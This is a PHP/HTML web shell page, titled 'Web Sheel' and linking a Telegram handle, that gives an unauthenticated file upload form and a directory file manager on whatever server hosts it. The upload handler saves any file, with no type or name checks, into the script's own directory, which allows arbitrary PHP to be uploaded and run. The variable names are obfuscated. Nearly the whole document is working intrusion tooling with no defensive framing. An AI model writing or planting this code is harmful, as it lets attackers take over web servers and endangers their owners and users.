<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Sheel</title>
    <SCript src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.2.1/client.min.js"></SCript>
    <link rel="Web Site icon" type="png" href="http://solevisible.com/images/alfamini.png">
    <script src="C:\xampp\htdocs\Code_1\praject16\tamrin\notify.js"></script>
</head>

<body>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Chokokutai&display=swap');
    </style>
    <div class="file_mnigr">
        <form enctype="multipart/form-data" action=<?php echo $_SERVER['PHP_SELF'] ?> method="post">
            <p>File Uplodes :</p>
            <input type="file" name="File_uplodes" id="File_1"><br><br>
            <input type="submit" name="submit" value="Done" id="submit">

        </form>
        <p>File Manegr :</p>
        <p>Dir Name :
            <?php $Direc = __DIR__ . DIRECTORY_SEPARATOR;
            echo "<a style='color:aqua' href='$Direc'>$Direc</a>" ?>
        </p>
        <table>
            <tr>
                <?php File_Manegr() ?>
            </tr>
        </table>
        <hr style="margin-bottom: 0;">
        <span id="Time">

            <p id="Os"></p>
            <p id="time"></p>
            <p id="getBrowser"></p>
            <script>
                function Time() {
                    let newdeta = new Date();
                    let Honde = newdeta.getHours();
                    let k = newdeta.getMinutes();
                    let d = newdeta.getSeconds();
                    let Doc = document.getElementById('time')
                    let Out5 = Doc.innerHTML = 'Time : ' + Honde + ':' + k + ':' + d


                }

                setInterval(Time, 1000)

                Time()
                function OS_name() {
                    let Js = new ClientJS();
                    console.log(Js)
                    let os_name = Js.getOS();
                    let getBrowser = Js.getBrowser();
                    document.getElementById('Os').innerHTML = 'OS Name : ' + os_name
                    document.getElementById('getBrowser').innerHTML = 'Browser : ' + getBrowser

                }
                OS_name()


            </script>

        </span>


    </div>
    <span><a id="swap" href="https://t.me/VOLHALTY">VOLHALTY</a></span>
    <style>
        * {
            font-family: Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
        }

        body {
            background-color: black;
            color: aliceblue;

        }

        a {
            text-decoration: none;
            color: aliceblue;
        }

        span {
            color: aqua;
        }

        #Time {
            display: flex;
            color: aliceblue;
            text-align: center;
            height: 70px;




        }

        #swap {
            font-family: "Chokokutai", system-ui;
            position: absolute;
            top: 97%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: beige;
            font-size: 10px;
            text-shadow: 0 0 20px aliceblue;

        }

        div {
            border-color: beige;
            border: 2px solid;
            width: 300px;
            height: 500px;
            padding: 1rem;
            border-radius: 2rem;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            overflow: scroll;
        }

        p {
            overflow: hidden;
        }

        input[type="file"] {
            color: aqua;

        }

        #submit {
            background-color: black;
            color: aliceblue;
            border: 2px solid aliceblue;
            border-radius: 2rem;
            transition: 1s;
        }

        #submit:hover {
            border-color: aqua;
            box-shadow: 0 0 20px 0 aqua;
            transition: 1s;
        }
    </style>


</body>

</html>
<?php function File_Manegr()
{
    $o_3c4e6dbf3e1d = __DIR__ . DIRECTORY_SEPARATOR;
    $g_e0740abfbc61 = scandir($o_3c4e6dbf3e1d);
    foreach ($g_e0740abfbc61 as $g_e0740abfbc61) {
        if (in_array($g_e0740abfbc61, array('.', '..'))) {
            continue;
        }
        echo "<a href='$g_e0740abfbc61' >file name : <span>$g_e0740abfbc61</span></a> <br>";
        ;
    }
}
function File_uplodes()
{
    if (isset($_POST['submit'])) {
        $c_736007832d21 = __DIR__ . DIRECTORY_SEPARATOR;
        $j_b068931cc450 = $_FILES['File_uplodes']['name'];
        $i_1784d127edf6 = $c_736007832d21 . '/' . $j_b068931cc450;
        $o_d4d8f3b60845 = move_uploaded_file($_FILES['File_uplodes']['tmp_name'], $i_1784d127edf6);
        if ($o_d4d8f3b60845) {
            $r_3090ad88ff7c = $j_b068931cc450;
            echo "<script> document.addEventListener('DOMContentLoaded' , function(){alert('File uploaded successfully -> $r_3090ad88ff7c ')})</script>";
        }
    }
}
File_uplodes() ?>